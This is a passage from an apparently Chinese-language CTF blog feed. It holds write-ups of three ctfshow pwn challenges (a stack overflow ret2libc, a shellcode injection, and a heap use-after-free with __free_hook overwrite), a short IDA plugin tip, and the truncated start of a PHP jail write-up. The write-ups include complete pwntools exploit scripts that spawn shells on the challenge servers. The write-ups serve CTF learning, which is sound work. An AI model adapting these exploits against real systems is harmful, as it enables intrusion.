**envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's your name? "</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  v6 = v3;</span><br><span class="line">  buf[v3 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Welcome to the CTFshow Moon cake cup! %s!\n"</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下保护只开了NX.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>先一波正常栈溢出,通过<code>printf</code>函数泄露出libc的真实地址和libc版本.</p><p>(但这里远程环境libc 版本,我之前泄露libc死活泄露不出来,看了第二题的libc才猜测两题环境可能一样,tcl)</p><p>然后再通过一波栈溢出getshell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 15:40:41</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn01'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28075</span>]</span><br><span class="line"><span class="comment">#GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400700 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400702 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400578 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400703 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400701 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004ce : ret </span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">rdi_ret=<span class="number">0x0000000000400703</span></span><br><span class="line">ret=<span class="number">0x00000000004004ce</span> </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(ret)+p64(rdi_ret)+p64(e.got[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'printf'</span>])+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(hex(addr))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'printf'</span>,addr) <span class="comment">#Ubuntu GLIBC 2.27-3ubuntu1</span></span><br><span class="line"><span class="comment">#p.sendline('1'*0x28+p64(rdi_ret)+p64(0x601100)+p64(x.dump('gets'))+p64(rdi_ret)+p64(0x601100)+p64(x.dump('puts'))+p64(rdi_ret)+p64(0x601100)+p64(ret)+p64(x.dump('system'))+p64(e.sym['_start']))</span></span><br><span class="line"><span class="comment">#p.sendline('/bin/sh\x00')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x28</span>+p64(rdi_ret)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(ret)+p64(x.dump(<span class="string">'system'</span>))+p64(e.sym[<span class="string">'_start'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="容易的胖"><a href="#容易的胖" class="headerlink" title="容易的胖"></a>容易的胖</h2><p>题目是i386(32位)题目,先看来下了保护发现不仅什么没开.还有读写执行权限(喜).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>审计下题目代码,发现通过fgets函数用我们可以写入至多256个字节长度的shellcode.</p><p>同时,<code>read(0, &amp;s, 0x14u);</code>触有栈溢出但只能让我们溢出到<code>edp</code>.</p><p>加上,有<code>strcmp(&amp;s, &quot;yes\n&quot;)</code>判断需要我们bypass.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> *v3; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;a1;</span><br><span class="line">  sub_80485A6();</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(::s, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your shellcode"</span>);</span><br><span class="line">  fgets(::s, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you know how to use shellcode????"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s, <span class="string">"yes\n"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you may be need learn it"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ok,good"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过<code>yes\n\x00</code>+code的方法来绕过strcmp函数。同时，由于题目没有开NX与PIE，因此我们可以通过ida静态分析出通过fgets函数写入的shellcode存放到<code>0x804a040</code>。</p><p>因此我们可以通过栈溢出控制<code>edp</code>，再通过栈特性间接控制<code>eip</code>，在让让<code>eip</code>指向我们shellcode的地址，从而getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/20 16:41:27</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./moonpwn02'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28157</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(p32((<span class="number">0x804a040</span>+<span class="number">4</span>))+asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#print(hex(len(pay)))</span></span><br><span class="line">p.sendline(<span class="string">'yes\n\x00'</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+<span class="string">'\x00'</span>*<span class="number">0x8</span>+p32(<span class="number">0x804a040</span>+<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Moon-note"><a href="#Moon-note" class="headerlink" title="Moon_note"></a>Moon_note</h2><p>题目所有保护全开，是个堆题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>题目主要分为creat_notetitle,creat_content,show_content,delet_content_title.</p><p>题目主要问题出现在free chunk功能函数处：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Title of note to delete: "</span>);</span><br><span class="line">  getnline(&amp;v2, <span class="number">16L</span>L);</span><br><span class="line">  ptr = find_note(&amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">2</span>) + <span class="number">24L</span>L) = *((_QWORD *)ptr + <span class="number">3</span>);</span><br><span class="line">    *(_QWORD *)(*((_QWORD *)ptr + <span class="number">3</span>) + <span class="number">16L</span>L) = *((_QWORD *)ptr + <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)ptr + <span class="number">4</span>)); <span class="comment">//没有清空内容</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//没有note titile chunk清空内容</span></span><br><span class="line">    --<span class="built_in">size</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在free时没有清空残余内容，导致uaf存在。</p><p>通过notetitle chunk free后，再add 仍指向content chunk .从而通show函数泄露出content chunk addr。</p><p>同时，经过测试libc版本低于2.29。因此还可以利用这free chunk 功能函数制造content chunk  double free。</p><p>从而让content chunk 错位改造出大于0x420的chunk 头，free掉构造出unsorted bin，从而泄露出libc。</p><p>然后通过<code>__free_hook</code>getshell。</p><p>（ps：这里偏移很奇怪，我原来本地libc2.27泄露出来unsorted bin addr 到<code>main_arena</code>为88 字节，然而远程环境为96）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/09/21 01:25:02</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Moon_note.note'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28079</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(title,size,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to write content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line">    p.recvuntil(<span class="string">'Size of content'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Title of note to show content:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(title)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Choice: Title of note to delete:'</span>)</span><br><span class="line">    p.sendline(str(title))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    add_note(str(i))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_note(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x48</span>,p64(addr<span class="number">-0x20</span>)+p64(addr<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x48</span>,<span class="string">'11111'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x48</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">    add(i+<span class="number">6</span>,<span class="number">0x48</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add_note(<span class="number">4</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">molloc_hook_addr=u64(p.recvline()[<span class="number">1</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span><span class="number">-0x10</span></span><br><span class="line">log.info(hex(molloc_hook_addr))</span><br><span class="line">x=finder(<span class="string">'__malloc_hook'</span>,molloc_hook_addr)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add_note(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">22</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">23</span>,<span class="number">0x48</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来… (⊙﹏⊙)</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>\`could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!\`报错缓解方法</title>
    <link href="lexsd6.github.io/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/"/>
    <id>lexsd6.github.io/2021/09/16/&#39;could%20not%20patch%20the%20PLT%20stub;%20unexpected%20PLT%20format%20or%20the%20file%20has%20been%20modified%20after%20linking!&#39;%E6%8A%A5%E9%94%99%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95/</id>
    <published>2021-09-16T03:39:36.860Z</published>
    <updated>2021-09-16T05:43:36.860Z</updated>
    
    <content type="html"><![CDATA[<p>额,之前一直被<code>could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!</code>这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。<a id="more"></a></p><h2 id="报错状况描述"><a href="#报错状况描述" class="headerlink" title="报错状况描述"></a>报错状况描述</h2><p>在报错后，出现 <code>.plt.sec</code> 的segement。libc的symbols能被ida正常解析，但是并未被ida自动连接绑定上。本该解析libc symbols的地方，显示的是<code>.plt.sec</code>的值， 如图：</p><p><img src="image-20210916112022149.png" alt="image-20210916112022149"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>添加插件：pltresolver</p><p>项目地址：<a href="https://github.com/veritas501/pltresolver" target="_blank" rel="noopener">https://github.com/veritas501/pltresolver</a></p><p>在ida项目中的<code>plugins</code>倒入脚本：</p><p><img src="image-20210916113633798.png" alt="image-20210916113633798"></p><p>打开ida看到<code>pltResolver plugin has been loaded.Press Ctrl+Shift+J to resolve .plt.sec symbols.</code>即为倒入成功！</p><p><img src="image-20210916113730185.png" alt="image-20210916113730185"></p><h2 id="修复后效果"><a href="#修复后效果" class="headerlink" title="修复后效果"></a>修复后效果</h2><p>看到ida 把libc sysmbols用重新识别上了： </p><p><img src="image-20210916113420325.png" alt="image-20210916113420325"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;额,之前一直被&lt;code&gt;could not patch the PLT stub; unexpected PLT format or the file has been modified after linking!&lt;/code&gt;这个报错恶心了很久,今天无意间终于找到了解决(补救方案)。</summary>
    
    
    
    <category term="tools" scheme="lexsd6.github.io/categories/tools/"/>
    
    
    <category term="ida" scheme="lexsd6.github.io/tags/ida/"/>
    
    <category term="problem_resolve" scheme="lexsd6.github.io/tags/problem-resolve/"/>
    
  </entry>
  
  <entry>
    <title>5种字符&#39;(^.9)&#39;构造php_shellcode</title>
    <link href="lexsd6.github.io/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/"/>
    <id>lexsd6.github.io/2021/09/03/5%E7%A7%8D%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0php_shellcode/</id>
    <published>2021-09-03T01:50:00.222Z</published>
    <updated>2021-09-15T06:57:37.259Z</updated>
    
    <content type="html"><![CDATA[<p>2021_uiuctf中出了一道jali题PHPfuck,题目要求用5种字符构造出php shellcode,感觉很有意思便记录下来。<a id="more"></a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>这道题给的很洁净，就是下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Flag is inside ./flag.php :)</span></span><br><span class="line">($x=str_replace(<span class="string">"`"</span>,<span class="string">""</span>,strval($_REQUEST[<span class="string">"x"</span>])))&amp;&amp;strlen(count_chars($x,<span class="number">3</span>))&lt;=<span class="number">5</span>?<span class="keyword">print</span>(<span class="keyword">eval</span>(<span class="string">"return $x;"</span>)):show_source(<span class="keyword">__FILE__</span>)&amp;&amp;phpinfo();</span><br></pre></td></tr></table></figure><p>（当然在比赛结束后，官方也分享了环境<a href="https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）" target="_blank" rel="noopener">https://github.com/sigpwny/UIUCTF-2021-Public/tree/master/jail/phpfuck）</a></p><p>题目通过了<code>strlen(count_chars($x,3))&lt;=5</code>限制我们最多用5个字符。</p><p>这五个字符，一度困扰了我很久，因为我一开始想到的是<code>(^.&#39;)</code>。。。。。。</p><h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 